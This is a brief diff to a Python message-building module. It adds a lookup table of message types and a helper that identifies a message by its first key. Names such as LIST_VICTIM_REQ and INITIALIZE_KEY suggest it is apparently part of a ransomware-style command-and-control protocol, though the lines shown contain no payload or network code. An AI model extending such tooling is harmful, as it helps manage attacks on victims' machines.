@@ -15,6 +15,20 @@ import json
 # --------------------------------------------
 
 
+MESSAGE_TYPE = {
+    'LIST_REQ': 'LIST_VICTIM_REQ',
+    'VICTIM': 'LIST_VICTIM_RESP',
+    'LIST_END': 'LIST_VICTIM_END',
+    'HIST_REQ': 'HISTORY_REQ',
+    'HIST_RESP': 'HISTORY_RESP',
+    'HIST_END': 'HISTORY_END',
+    'CHGSTATE': 'CHANGE_STATE',
+    'INITIALIZE': 'INITIALIZE_REQ',
+    'KEY_RESP': 'INITIALIZE_KEY',
+    'CONFIGURE': 'INITIALIZE_RESP'
+}
+
+
 def list_victim_req():
     list_victim_req = {
         'LIST_REQ': None
@@ -170,3 +184,7 @@ def get_message(select_msg, params=None):
         if len(params) != 6:
             return None
         return initialize_resp(params[0], params[1], params[2], params[3], params[4], params[5])
+
+def get_message_type(message):
+    first_key = list(message.keys())[0]
+    return MESSAGE_TYPE[first_key]
